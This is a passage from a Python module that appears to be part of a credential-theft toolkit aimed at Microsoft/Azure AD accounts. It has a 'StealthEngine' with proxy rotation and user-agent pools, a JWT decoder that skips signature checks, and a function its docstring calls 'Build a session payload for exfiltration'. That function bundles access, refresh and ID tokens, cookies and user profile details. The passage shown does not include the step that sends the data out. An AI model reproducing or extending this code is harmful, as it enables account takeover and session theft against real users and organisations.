        if os.environ.get('DISABLE_SSL_VERIFY', '').lower() == 'true':
            sess.verify = False
            logger.warning("SSL verification disabled - insecure!")
        
        return sess
    
    def get_stats(self) -> Dict[str, Any]:
        """Get stealth engine statistics including metrics."""
        metrics_stats = self.metrics.get_stats()
        return {
            'session_count': self._session_count,
            'proxy_count': len(self.proxy_list),
            'proxy_rotation_index': self.proxy_index,
            'user_agent_pool_size': len(self.USER_AGENTS),
            'bypass_cache_size': len(self._bypass_cache),
            'healthy_proxies': len(self._healthy_proxies),
            'failed_proxies': len(self._failed_proxies),
            'pool_size': len(self._session_pool),
            **metrics_stats,
        }


# ========================================================================
# JWT UTILITIES
# ========================================================================
def decode_jwt(token: str) -> Optional[Dict[str, Any]]:
    """
    Decode a JWT token payload (without signature verification).
    """
    try:
        parts = token.split('.')
        if len(parts) != 3:
            logger.debug(f"Invalid JWT format: expected 3 parts, got {len(parts)}")
            return None
        
        payload = parts[1]
        padding = (-len(payload)) % 4
        if padding:
            payload += '=' * padding
        
        try:
            decoded = json.loads(base64.urlsafe_b64decode(payload))
        except (binascii.Error, ValueError, json.JSONDecodeError) as e:
            logger.debug(f"JWT decode failed: {e}")
            return None
        
        if 'tid' in decoded:
            logger.debug(f"JWT tenant ID: {decoded['tid']}")
        if 'upn' in decoded:
            logger.debug(f"JWT UPN: {decoded['upn']}")
        if 'roles' in decoded:
            logger.debug(f"JWT roles: {decoded['roles']}")
        
        return decoded
    except Exception as e:
        logger.debug(f"JWT decode unexpected error: {e}")
        return None


def validate_jwt(token: str, expected_issuer: Optional[str] = None) -> bool:
    """
    Basic JWT validation (checks expiration and issuer if provided).
    """
    try:
        payload = decode_jwt(token)
        if not payload:
            return False
        
        exp = payload.get('exp')
        if exp:
            exp_time = datetime.fromtimestamp(exp, tz=timezone.utc)
            if exp_time < datetime.now(timezone.utc):
                logger.debug(f"JWT expired at {exp_time}")
                return False
        
        if expected_issuer:
            iss = payload.get('iss')
            if iss != expected_issuer:
                logger.debug(f"JWT issuer mismatch: {iss} vs {expected_issuer}")
                return False
        
        return True
    except Exception as e:
        logger.debug(f"JWT validation failed: {e}")
        return False


# ========================================================================
# SESSION PAYLOAD BUILDER
# ========================================================================
def build_session_payload(
    token_data: Dict[str, Any],
    cookies: List[Dict[str, Any]],
    user_info: Dict[str, Any],
    client_id: str,
    tenant: str,
    metadata: Optional[Dict[str, Any]] = None
) -> Dict[str, Any]:
    """Build a session payload for exfiltration."""
    access_token = token_data.get('access_token', '')
    id_token = token_data.get('id_token', '')
    jwt_claims = {}
    
    if id_token:
        jwt_claims['id_token'] = decode_jwt(id_token)
        logger.token("ID token decoded successfully")
    
    if access_token:
        jwt_claims['access_token'] = decode_jwt(access_token)
        logger.token("Access token decoded successfully")
    
    payload = {
        'version': '2.1',
        'capture_timestamp': datetime.now(timezone.utc).isoformat(),
        'client_id': client_id,
        'tenant': tenant,
        'tokens': {
            'access_token': access_token,
            'refresh_token': token_data.get('refresh_token', ''),
            'id_token': id_token,
            'expires_in': token_data.get('expires_in', 0),
            'token_type': token_data.get('token_type', ''),
            'scope': token_data.get('scope', ''),
        },
        'jwt_claims': jwt_claims,
        'user': {
            'upn': user_info.get('userPrincipalName', ''),
            'display_name': user_info.get('displayName', ''),
            'email': user_info.get('mail', ''),
            'job_title': user_info.get('jobTitle', ''),
            'tenant_id': user_info.get('tenantId', ''),
            'user_id': user_info.get('id', ''),
            'office_location': user_info.get('officeLocation', ''),
        },
        'cookies': cookies,
        'cookie_count': len(cookies),
        'metadata': metadata or {},
    }
    
    logger.info(f"Built session payload: {payload['user']['upn']} | {payload['cookie_count']} cookies")
    return payload


# ========================================================================
# UTILITY FUNCTIONS
# ========================================================================
def safe_json_loads(data: str, default: Any = None) -> Any:
    """Safely load JSON with fallback."""
    try:
        return json.loads(data)
    except json.JSONDecodeError as e:
        logger.debug(f"JSON decode error: {e}")
        return default


def safe_json_dumps(data: Any, indent: Optional[int] = None) -> str:
    """Safely dump JSON with fallback."""
    try:
        return json.dumps(data, indent=indent, default=str)
    except Exception as e:
        logger.debug(f"JSON encode error: {e}")
        return str(data)


def truncate_string(s: str, max_length: int = 100) -> str:
    """Truncate a string to a maximum length."""
    if len(s) <= max_length:
        return s
    return s[:max_length] + "..."


def get_timestamp() -> str:
    """Get current UTC timestamp in ISO format."""
    return datetime.now(timezone.utc).isoformat()


# ========================================================================
# REQUEST TRACING
# ========================================================================
def trace_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    **kwargs
) -> requests.Response:
    """
    Make a request with detailed tracing for debugging.
    
    Args:
        url: Request URL
        method: HTTP method (GET, POST, etc.)
        headers: Request headers
        data: Request data
        **kwargs: Additional arguments to pass to requests.request()
    
    Returns:
        requests.Response object
    """
    logger.debug(f"[TRACE] Request: {method} {url}")
    if headers:
        safe_headers = {
            k: v[:50] if isinstance(v, str) else v
            for k, v in headers.items()
        }
        logger.debug(f"[TRACE] Headers: {json.dumps(safe_headers, indent=2)}")
    if data:
        logger.debug(f"[TRACE] Data: {str(data)[:200]}")
    
    start = time.time()
    try:
        response = requests.request(method, url, headers=headers, data=data, **kwargs)
        duration = (time.time() - start) * 1000
        logger.debug(f"[TRACE] Response: {response.status_code} in {duration:.2f}ms")
        logger.debug(f"[TRACE] Response headers: {json.dumps(dict(response.headers), indent=2)}")
        return response
    except Exception as e:
        duration = (time.time() - start) * 1000
        logger.error(f"[TRACE] Request failed after {duration:.2f}ms: {e}")
        logger.debug(traceback.format_exc())
        raise


# ========================================================================
# EXPORTS
# ========================================================================
__all__ = [
    # Core classes
    'CryptoUtils',
    'StealthEngine',
    'RetryPolicy',
    'DNSCache',
    'APIResponse',
    'UserAgentManager',
    'MetricsCollector',
    # JWT utilities
    'decode_jwt',
    'validate_jwt',
    # Session utilities
    'build_session_payload',
    # Utility functions
    'safe_json_loads',
    'safe_json_dumps',
    'truncate_string',
    'get_timestamp',
    'trace_request',
    # Module-level exports
    'logger',
    'CRYPTO_AVAILABLE',
]